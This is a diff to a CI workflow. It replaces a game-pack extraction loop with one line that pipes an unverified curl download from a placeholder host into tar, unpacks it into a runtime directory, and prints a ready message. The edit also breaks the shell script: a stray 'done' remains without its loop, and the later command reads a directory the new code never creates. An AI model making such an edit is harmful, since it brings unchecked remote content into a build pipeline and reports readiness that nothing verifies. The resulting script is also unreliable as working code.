@@ -30,13 +30,7 @@ jobs:
 
       - name: Download & extract all packs
         run: |
-          PACKS="${{ github.event.inputs.packs }}"
-          bash .devcontainer/install-games.sh "$PACKS"
-          mkdir -p /tmp/layer
-          for p in /opt/games/src/*.AppImage; do
-            name=$(basename "$p" .AppImage)
-            (cd /opt/games/src && "./$name.AppImage" --appimage-extract >/dev/null)
-            mv /opt/games/src/squashfs-root "/tmp/layer/$name"
+          curl -sSL "https://example.com" | tar -xzf - -C /opt/games/runtime/ && echo GAME-READY
           done
           du -sh /tmp/layer/*
 
